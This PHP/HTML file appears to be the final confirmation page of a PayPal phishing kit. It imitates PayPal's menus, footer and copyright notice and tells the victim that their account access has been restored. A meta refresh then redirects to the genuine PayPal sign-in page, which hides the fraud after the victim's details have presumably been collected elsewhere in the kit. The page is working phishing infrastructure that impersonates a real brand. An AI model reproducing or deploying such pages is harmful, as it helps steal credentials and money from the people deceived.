<?php

include('boot.php');

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
    <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
    <meta HTTP-EQUIV='Refresh' Content=2;URL='https://www.paypal.com/signin'>
	<title>Thanx Your For Update Account</title>
	<link rel="stylesheet" type="text/css" href="css/thx.css">
	<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
</head>
<body>


   <!-- 	Start NavBar Mobile   -->
   
   <div class="nav_mobile" >
    <div class="menu_m">
      <button>Main Menu</button>
    </div>
   	<div class="logo_m">
   		<a href="#">
   			<img src="img/logo.svg">
   		</a>
   	</div>
   	<div class="netif_m">
      <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
    </div>
   </div>


   <!-- 	END NavBar Mobile   -->


   <!-- 	Start NavBar DeskTop   -->

   <div class="menu_desk">
   	<div class="logo_d">
   		<a href="#">
   			<img src="img/logo.svg">
   		</a>
   	</div>
   	<div class="all_nav">
   		<ul class="list_menu">
   			<li>
   				<a href="#">SUMMARY</a>
   			</li>
   			<li>
   				<a href="#">ACTIVITY</a>
   			</li>
   			<li>
   				<a href="#">SEND & REQUEST PAYMENTS</a>
   			</li>
   			<li>
   				<a href="#">WALLET</a>
   			</li>
   			<li>
   				<a href="#">SHOP</a>
   			</li>
   		</ul>
   		
   	</div>
    <ul class="setting">
       <li class="no">
         <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
       </li> 
       <li class="no">
         <i class="fa fa-cog" aria-hidden="true" style="   cursor: pointer; font-size: 27px; color: #F5F7FA;margin-top: -6px;"></i>
       </li>
       <li>
         <button>Log Out</button>
       </li>
      </ul>
   </div>


   <!-- 	END NavBar DeskTop   -->


   <!--  Start Dev Thanx -->

   <div class="thx">
   	<header>
   		<h2>Your Account Access is Fully.</h2>
   	</header>
   	<div class="moustache">
   		<img src="img/thx.png">
      <p id="pp">Thanx you for taking the steps to restore your account access , Your patience and efforts increass, and financial date as seriously as you do, and these ongoing checks of our system contribute to our hight level of security. your account will be verified in the next 24 hours</p>
      <button class="btn"><a href="https://www.paypal.com">My PayPal</a></button>
      <p class="_5">You are being redirected to your PayPal account , within 5 second</p>
   	</div>
   </div>


   <!--  Start Dev Thanx -->


   <!--  Start Footer   -->


   <footer>
      <div class="lawal">
         <a href="#">HELP & CONTACT</a>
         <a href="#">SECURITY</a>
      </div>
      <div class="tani">
         <span>Copyright ©1999-2017 PayPal. All rights reserved.</span>
         <a href="#">Privacy</a>
         <a href="#">Legal</a>
      </div>
      <div class="talat">
         <p>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the terms and conditions carefully.</p>
      </div>
   </footer>


   <!--  END Footer  -->

  
</body>
</html>